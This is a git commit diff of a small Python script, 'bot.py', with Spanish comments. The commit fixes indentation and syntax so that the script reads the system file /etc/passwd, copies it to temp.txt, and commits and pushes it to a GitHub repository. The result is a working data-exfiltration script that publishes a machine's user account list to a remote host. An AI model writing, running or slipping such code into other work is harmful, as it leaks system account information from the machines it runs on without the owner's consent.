47e4ef526c32038cc4ca962b8c6ee104bf3afdab
handicap11 <158589346+handicap11@users.noreply.github.com>
2024-02-09 16:15:22 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,23 +1,23 @@
 import subprocess
 
 def run():
-
     archivo = '/etc/passwd'
-    mensaje_commit = 'archivo passwd rn Github'
+    mensaje_commit = 'Archivo passwd en GitHub'
 
-with open(archivo, 'r') as file:
-    contenido = file.read()
+    with open(archivo, 'r') as file:
+        contenido = file.read()
+
     repo_nombre = 'handicap11'
     archivo_en_repo = 'passwd_backup.txt'
 
-with open ('temp.txt', 'w') as temp_file:
-    temp_file.write(contenido)
+    with open ('temp.txt', 'w') as temp_file:
+        temp_file.write(contenido)
 
-subprocess.run(['git', 'add', 'temp_txt'])
-subprocess.run[('git', 'commit', '-m', mensaje_commit])
-subprocess.run(['git', 'push','origin', 'main'])
+    subprocess.run(['git', 'add', 'temp.txt'])
+    subprocess.run(['git', 'commit', '-m', mensaje_commit])
+    subprocess.run(['git', 'push', 'origin', 'main'])
 
-print(f'Archivo {archivo} publicado en Github en este reporsitorio {repo_nombre}/{archivo_en_repo}')
+    print(f'Archivo {archivo} publicado en GitHub en el repositorio {repo_nombre}/{archivo_en_repo}')
+
 # Llamamos a la función run()
 run()
-
